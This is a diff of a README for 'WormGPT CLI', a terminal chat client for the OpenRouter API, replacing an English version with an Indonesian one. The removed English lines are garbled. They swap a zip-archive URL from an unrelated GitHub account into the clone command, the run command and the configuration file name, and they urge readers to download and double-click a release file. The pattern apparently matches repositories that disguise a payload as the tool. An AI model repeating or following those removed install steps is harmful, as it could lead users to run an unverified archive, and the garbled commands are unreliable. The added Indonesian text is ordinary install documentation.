@@ -1,67 +1,140 @@
-🐛 worm-gpt - Simple Tool for Chatting with AI
-Download Now
+# 🐛 WormGPT CLI
 
-🚀 Getting Started
-WormGPT CLI is designed to help you chat with AI easily. In just a few steps, you can download the tool and start exploring its features. Follow the instructions below to get everything set up.
+**Simple Tool for Chatting with AI via Terminal**
 
-📥 Download & Install
-Visit the Releases Page: Go to the Releases Page to download the latest version.
+WormGPT CLI adalah tool ringan berbasis Python yang memungkinkan kamu berinteraksi dengan AI langsung dari terminal dengan tampilan yang clean dan modern.
 
-Choose Your File: Look for the file that matches your operating system. If you are unsure, choose the appropriate version based on your setup.
+---
 
-Download the File: Click on the link to download the file to your computer.
+## 🚀 Getting Started
 
-Run the Application: Once downloaded, locate the file in your downloads folder. Double-click it to run the application. Make sure to allow any necessary permissions.
+Ikuti langkah-langkah berikut untuk mulai menggunakan WormGPT:
 
-Follow On-Screen Instructions: The application will guide you through any first-time setup requirements.
+### 📥 Download & Install
 
-✅ Requirements
-Before you install, ensure your system meets the following requirements:
+1. Kunjungi repository:
+   [https://github.com/GarzZOfficial/worm_gpt.git](https://github.com/GarzZOfficial/worm_gpt.git)
 
-Python 3.6 or higher: This is necessary for the application to run correctly. You can check your version of Python by running python --version in your terminal.
-Pip Installed: This tool helps you install other Python packages easily. It usually comes with Python, but you can confirm by running pip --version.
-OpenRouter API Key: You need this key to access the OpenRouter features. You can get your API key here.
-⚙️ Installation Instructions
-For users comfortable with the command line, you can also install WormGPT CLI manually:
+2. Clone repository:
 
-Clone the Repository: Open your terminal and type the following command:
+```bash
+git clone https://github.com/GarzZOfficial/worm_gpt.git
+```
 
-git clone https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip
-Navigate to the Directory: Change into the project directory using:
+3. Masuk ke folder project:
 
-cd worm-gpt
-Run WormGPT: Finally, start the application by typing:
+```bash
+cd worm_gpt
+```
 
-python3 https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip
-🔑 Set Your API Key
-To fully utilize WormGPT, you need to set your OpenRouter API key:
+4. Install dependencies:
 
-Locate the Configuration File: This file is named https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip and is created automatically when you run the application for the first time.
+```bash
+pip install -r requirements.txt
+```
 
-Open the File: Use any text editor to open https://github.com/GarzZOfficial/worm_gpt.git
+5. Jalankan aplikasi:
 
-Insert Your API Key: Find the key field and enter your API key. Save the file.
+```bash
+python main.py
+```
 
-Restart the Application: Close WormGPT and launch it again. Your settings will take effect.
+---
 
-🌟 Features
-WormGPT comes packed with useful features:
+## ✅ Requirements
 
-OpenRouter API Integration: Access advanced AI capabilities through OpenRouter.
-Auto Language Detection: The application recognizes the language you type and switches accordingly.
-Multi-Language Support: Communicate in English, Indonesian, Spanish, Arabic, Thai, or Portuguese.
-Interactive Chat Sessions: Enjoy a smooth and engaging chat experience with realistic typing effects.
-Stylish CLI UI: The user interface is designed to be clean and visually appealing.
-Easy Configuration: Quickly set up your API key and preferred model with straightforward options.
-Configuration Auto-Saved: Your settings are saved automatically in the https://raw.githubusercontent.com/Vighne7185/worm-gpt/main/assets/worm-gpt_v1.5.zip file.
-🤝 Community Support
-If you encounter any issues or have questions, please feel free to reach out to the community. You can open an issue in the GitHub repository or check existing discussions for help.
+Pastikan sistem kamu memenuhi syarat berikut:
 
-🔗 Useful Links
-WormGPT on GitHub
-OpenRouter API Key Signup
-GitHub Issues Page
-📖 Documentation
-For more detailed guidance on specific functionalities and troubleshooting, refer to the documentation within the repository. Regular updates and improvements will ensure the tool remains effective and user-friendly.
+* Python 3.6 atau lebih baru
+* Pip (biasanya sudah termasuk dalam Python)
+* OpenRouter API Key
 
-Now you are ready to explore WormGPT! Enjoy chatting with AI seamlessly!
+Cek versi Python:
+
+```bash
+python --version
+```
+
+Cek pip:
+
+```bash
+pip --version
+```
+
+---
+
+## 🔑 Setup API Key
+
+Agar WormGPT bisa digunakan, kamu perlu menambahkan API Key:
+
+1. Jalankan aplikasi pertama kali
+2. File konfigurasi akan otomatis dibuat
+3. Buka file config (misalnya: `config.json`)
+4. Masukkan API Key OpenRouter kamu:
+
+```json
+{
+  "api_key": "YOUR_API_KEY_HERE"
+}
+```
+
+5. Simpan dan restart aplikasi
+
+---
+
+## 🌟 Features
+
+* 🔌 OpenRouter API Integration
+* 🌐 Auto Language Detection
+* 🗣 Multi-language Support (EN, ID, ES, AR, TH, PT)
+* 💬 Interactive Chat Session
+* 🎨 Stylish CLI Interface
+* ⚙️ Easy Configuration
+* 💾 Auto-save Settings
+
+---
+
+## ⚙️ Manual Installation (Alternative)
+
+Jika ingin cara manual:
+
+```bash
+git clone https://github.com/GarzZOfficial/worm_gpt.git
+cd worm_gpt
+pip install -r requirements.txt
+python main.py
+```
+
+---
+
+## 🤝 Support & Community
+
+Jika mengalami masalah:
+
+* Gunakan fitur Issues di GitHub
+* Cek diskusi yang sudah ada
+
+---
+
+## 🔗 Useful Links
+
+* GitHub Repository:
+  [https://github.com/GarzZOfficial/worm_gpt.git](https://github.com/GarzZOfficial/worm_gpt.git)
+
+* OpenRouter API:
+  [https://openrouter.ai](https://openrouter.ai)
+
+---
+
+## 📖 Documentation
+
+Dokumentasi lengkap tersedia di dalam repository.
+
+Tool ini akan terus di-update untuk meningkatkan performa dan fitur.
+
+---
+
+## 🎉 Enjoy!
+
+Sekarang kamu sudah siap menggunakan WormGPT CLI.
+Selamat mencoba 🚀
